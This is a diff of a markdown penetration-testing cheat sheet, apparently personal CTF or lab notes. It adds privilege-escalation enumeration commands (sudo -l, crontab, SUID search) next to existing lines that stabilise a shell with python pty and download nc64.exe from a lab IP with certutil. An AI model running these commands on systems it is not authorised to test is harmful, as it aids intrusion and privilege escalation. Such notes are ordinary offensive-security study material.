@@ -48,7 +48,7 @@ Locating scripts in unix:
 --------------------------------------
 ```
 locate *.nse | grep <servicename> 
-```
+``` 
 
 FOr stable shell and internal machine to machine download:
 --------------------------------------------------------------------
@@ -57,6 +57,20 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 certutil -urlcache -f http://10.10.14.154:8888/nc64.exe nc64.exe #(windows)
 wget http://ipaddress:portnumber/filename #(for both linux and windows)
 ```
+
+Privilege Escalation Commands:
+---------------------------------------------------------------------------
+```
+uname -a
+cat /proc/version
+id 
+history
+sudo -l
+cat /etc/crontab
+find / -perm -u=s -type f 2>/dev/null
+```
+
+ 
 
 SSH RELATED:
 ------------------------------------------------------------------------------------
